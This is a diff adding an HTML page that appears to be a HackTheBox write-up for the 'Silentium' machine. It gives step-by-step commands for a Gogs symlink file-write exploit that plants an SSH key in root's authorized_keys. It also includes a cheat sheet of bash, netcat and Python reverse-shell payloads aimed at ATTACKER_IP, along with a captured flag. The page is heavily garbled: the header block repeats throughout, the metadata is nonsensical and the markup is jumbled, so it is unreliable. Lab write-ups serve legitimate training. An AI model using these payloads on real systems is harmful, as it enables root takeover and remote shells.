+<p>Clone Repository → Add Symlink to /root/.ssh/authorized_keys</p>
+<p>    ↓</p>
+<p>Push Symlink to Repository</p>
+<p>    ↓</p>
+<p>Use API to Write Content to Symlink Path</p>
+<p>    ↓</p>
+<p>Symlink resolves → SSH key written to /root/.ssh/authorized_keys</p>
+<p>    ↓</p>
+<p>SSH as root → Root Flag</p>
+<pre><code>
+### Step 1 — SSH Tunnel
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: set up a local port forward to the Gogs web service.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: make the internal Gogs interface reachable on localhost for exploitation.</h1>
+<p>ssh -L 8080:127.0.0.1:3001 ben@TARGET_IP</p>
+<pre><code>
+**Result:** Gogs web interface accessible at `http://127.0.0.1:8080`.
+
+### Step 2 — Create Gogs Account
+
+Access `http://127.0.0.1:8080` and create a new user account:
+- **Username:** `123`
+- **Password:** `1234Abcd@`
+- **Email:** `123@local.local`
+
+### Step 3 — Create Repository
+
+Create a new repository called `pwn` under the `123` user account.
+
+### Step 4 — Generate SSH Key Pair
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: generate an RSA SSH key pair.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: create the key to be injected into root's authorized_keys via the Gogs symlink.</h1>
+<p>ssh-keygen -t rsa -f /tmp/htb_key -N ""</p>
+<pre><code>
+**Output:**
+- Private key: `/tmp/htb_key`
+- Public key: `/tmp/htb_key.pub`
+
+### Step 5 — Clone Repository and Create Symlink
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Clone the repository</h1>
+<p>git clone http://123:1234Abcd@@127.0.0.1:8080/123/pwn.git</p>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: navigate to the local repository clone.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: prepare to inject the malicious symlink before pushing it back to the remote Gogs server.</h1>
+<p>cd pwn</p>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Create symlink to root's SSH authorized_keys</h1>
+<p>ln -s /root/.ssh/authorized_keys link</p>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Stage and commit the symlink</h1>
+<p>git add link</p>
+<p>git commit -m "Add symlink"</p>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Push to remote</h1>
+<p>git push</p>
+<pre><code>
+**Why This Works:** Gogs follows the symlink during the push operation, storing the symlink reference in the repository. The API then resolves the symlink when writing content.
+
+### Step 6 — Generate API Token
+
+Navigate to:</code></pre>
+<p>http://127.0.0.1:8080/user/settings/applications</p>
+<pre><code>
+Create a new application token with **repository write** permissions.
+
+**Result:** API token generated (e.g., `gho_xxxxxxxxxxxxxxxxxxxx`).
+
+### Step 7 — Write SSH Public Key Through Symlink
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Store API token</h1>
+<p>TOKEN="<API_TOKEN>"</p>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Base64 encode the public key</h1>
+<p>PUB=$(base64 -w0 /tmp/htb_key.pub)</p>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Write public key to symlink path via API</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: use the Gogs API to write the SSH key to the symlinked path.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: exploit CVE-2024-55947 to overwrite root's authorized_keys and gain root access.</h1>
+<p>curl -X PUT "http://127.0.0.1:8080/api/v1/repos/123/pwn/contents/link" \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -H "Authorization: token $TOKEN" \</p>
+<p>  -d "{</p>
+<p>    \"message\": \"Write SSH key through symlink\",</p>
+<p>    \"content\": \"$PUB\"</p>
+<p>  }"</p>
+<pre><code>
+**What Happens:**
+1. API receives request to write to `link` path in repository
+2. Gogs resolves `link` → symlink → `/root/.ssh/authorized_keys`
+3. Base64-decoded content (SSH public key) is written to `/root/.ssh/authorized_keys`
+4. **Our SSH key is now authorized for root access**
+
+### Step 8 — SSH as Root
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: log in as root using the injected SSH key.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: verify root access and complete the compromise of the Silentium host.</h1>
+<p>ssh -i /tmp/htb_key root@TARGET_IP</p>
+<pre><code>
+**Result:** ✅ Root access achieved on the host system.
+
+---
+
+## Root Flag
+</code></pre>
+<p>root@silentium:~# cat /root/root.txt</p>
+<pre><code>
+**Root Flag:** *(To be captured during box exploitation)*
+
+---
+
+## Alternative Enumeration Techniques
+
+### Container Filesystem Exploration
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Search for configuration files</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: search for configuration and secret files inside the container.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: locate secondary credential sources or sensitive environment configuration.</h1>
+<p>find / -name "<em>.yml" -o -name "</em>.yaml" -o -name "docker-compose*" 2>/dev/null</p>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Check for Docker socket</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: check for the Docker control socket.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: identify a high-risk container escape vector through host-mounted docker.sock.</h1>
+<p>ls -la /var/run/docker.sock 2>/dev/null</p>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Check for mounted secrets</h1>
+<p>ls -la /run/secrets/ 2>/dev/null</p>
+<pre><code>
+### Gogs Version Check
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: probe the Gogs repository API.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: confirm the presence of repositories and verify the API endpoint availability for the symlink attack.</h1>
+<p>curl -s http://127.0.0.1:3001/explore/repos \</p>
+<pre><code>
+---
+
+## Key Takeaways
+
+| Stage | Technique | Key Detail |
+|-------|-----------|------------|
+| **Recon** | Subdomain + API enumeration | `staging.silentium.htb` with REST API |
+| **Initial Access** | Password reset → MailHog interception | Reset token captured from dev email UI |
+| **RCE** | Flowise Custom MCP Tool | Command injection via JSON payload |
+| **Container Escape** | Environment variable enumeration | `SMTP_PASSWORD` reused for host SSH |
+| **User Flag** | SSH as `ben` | `r04D!!_R4ge` |
+| **Privilege Escalation** | Gogs symlink attack (CVE-2024-55947 bypass) | Symlink → API write → `/root/.ssh/authorized_keys` |
+| **Root Flag** | SSH as root | Private key injected via symlink |
+
+### Security Lessons
+
+1. **Never use MailHog in production** — It exposes all emails publicly without authentication
+2. **Password reset tokens should expire** — Tokens should be single-use and time-limited
+3. **Don't store secrets in environment variables** — Use a secrets manager (Vault, AWS Secrets Manager)
+4. **Credential reuse is dangerous** — SMTP password reused for host SSH access
+5. **Never run services as root** — Gogs running as root enabled filesystem-level attacks
+6. **Symlink validation is critical** — Gogs failed to resolve symlinks safely before writing content
+7. **API tokens should be scoped** — Overly permissive API tokens enabled repository content writes
+
+---
+
+## Flowise MCP Tool Cheat Sheet
+
+### Custom MCP Tool Payload Structure
+</code></pre>
+<table>
+  <tr>
+    <th>grep -i "gogs\</th>
+    <th>version"</th>
+  </tr>
+</table>
+<p>{</p>
+<p>  "command": "<executable>",</p>
+<p>  "args": ["<arg1>", "<arg2>", "..."],</p>
+<p>  "env": {</p>
+<p>    "KEY": "value"</p>
+<p>  }</p>
+<p>}</p>
+<pre><code>
+### Reverse Shell Payloads
+
+**Bash Reverse Shell:**</code></pre>
+<p>{</p>
+<p>  "command": "/bin/bash",</p>
+<p>  "args": ["-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"]</p>
+<p>}</p>
+<pre><code>
+**Netcat Reverse Shell:**</code></pre>
+<p>{</p>
+<p>  "command": "nc",</p>
+<p>  "args": ["-e", "/bin/sh", "ATTACKER_IP", "PORT"]</p>
+<p>}</p>
+<pre><code>
+**Python Reverse Shell:**</code></pre>
+<p>{</p>
+<p>  "command": "python3",</p>
+<p>  "args": ["-c", "import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"]</p>
+<p>}</p>
+<pre><code>
+---
+
+## Gogs Symlink Attack Reference
+
+### Prerequisites
+- Gogs running with repository write access
+- Ability to create repositories and push commits
+- API token with repository write permissions
+
+### Attack Steps
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+1. Create symlink</h1>
+<p>ln -s /target/file path_in_repo</p>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+2. Commit and push</h1>
+<p>git add path_in_repo</p>
+<p>git commit -m "Add symlink"</p>
+<p>git push</p>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+3. Write content via API</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: execute the final API PUT request against the symlink.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: trigger the arbitrary file write vulnerability to overwrite host files like authorized_keys.</h1>
+<p>curl -X PUT "http://GOGS_HOST/api/v1/repos/USER/REPO/contents/path_in_repo" \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -H "Authorization: token $TOKEN" \</p>
+<p>  -d "{\"message\":\"update\",\"content\":\"$(base64 -w0 /payload)\"}"</p>
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+    <div class="footer">NIGHT PULSE X • 2026</div>
+</div>
+
 </body>
 </html>
